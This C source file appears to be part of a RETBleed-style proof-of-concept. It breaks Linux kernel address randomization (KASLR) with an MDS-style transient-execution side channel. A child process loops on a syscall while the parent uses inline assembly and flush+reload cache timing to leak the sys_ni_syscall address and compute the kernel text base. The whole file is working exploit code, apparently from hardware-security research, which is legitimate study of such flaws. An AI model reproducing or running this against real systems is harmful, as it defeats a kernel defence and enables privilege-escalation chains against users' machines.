// SPDX-License-Identifier: GPL-3.0-only
#include "retbleed.h"
#include <stdlib.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <string.h>

#define KBASE_START 0xffffffff81000000
#define KBASE_END   0xffffffffbe000000
#define SYS_NI_SYSCALL 0x44b0
#define MAX_ITS 200000
#define THRES 1

int do_break_kaslr() {
    u64 results[512] = {0};
    u8 *reloadbuffer = mmap_huge((u8 *)(8UL<<21), 1<<21);
    u8* leak = map_or_die((u8*)0x210eeff01000UL, 0x1000);
    leak[0] = 1;
    u64 t0 = get_ms();
    u64 prefix = 0xffffffff80000000UL | SYS_NI_SYSCALL;
    u64 guess = 0;
    char rotate = 21;
    INFO("Break KASLR (LP-MDS)...\n");
    for(int i = 0; i < MAX_ITS; ++i) {
        flush_range(reloadbuffer, 1<<10, 0x200);
        __asm__ volatile(
                "lfence\n"
                "movq (%0), %%r13\n"
                "xorq %[prefix], %%r13\n"
                "rorq %[rotate], %%r13\n"
                "shl $0xa, %%r13\n"
                "prefetcht0 (%%r13, %1)\n"
                "mfence\n"
                ::"r"(leak + 0x3f),
                "r"(reloadbuffer),
                [prefix]"r"(prefix),
                [rotate]"c"(rotate): "r13", "r12");
        reload_range(reloadbuffer, 1<<10, 0x200, results);
        // we have zero bias but we're sure 0 can not be the answer
        results[0] = 0;
        guess = max_index(results, 0x1ff);
        if (results[guess] > THRES) {
            break;
        }

#define PAGEFAULT
#ifdef PAGEFAULT
        madvise(leak, 1*4096, MADV_FREE);
#endif
    }

    if (guess == 0) {
        ERROR("Got nothing.. Maybe needs some tweaking for this hardware?\n");
        return 0;
    }

    u64 ni_syscall = prefix | (guess<<rotate);
    if (results[guess] <= THRES) {
        WARN("Weak signal. Result might be incorrect\n");
    }
    SUCCESS("sys_ni_syscall @ 0x%lx t=%0.3fs\n", ni_syscall, (get_ms()-t0)/1000.0);
    SUCCESS("kernel_text @ 0x%lx\n", ni_syscall - SYS_NI_SYSCALL);
    return ni_syscall - SYS_NI_SYSCALL;
}

int main(int argc, char *argv[])
{
    int cpid = fork();
    if (cpid == 0) {
        // child
        while (1) {
#define SYS_TUXCALL 184
            syscall(SYS_TUXCALL);
        }
        exit(0);
    }

    do_break_kaslr();
    kill(cpid, SIGTERM);
    return 0;
}
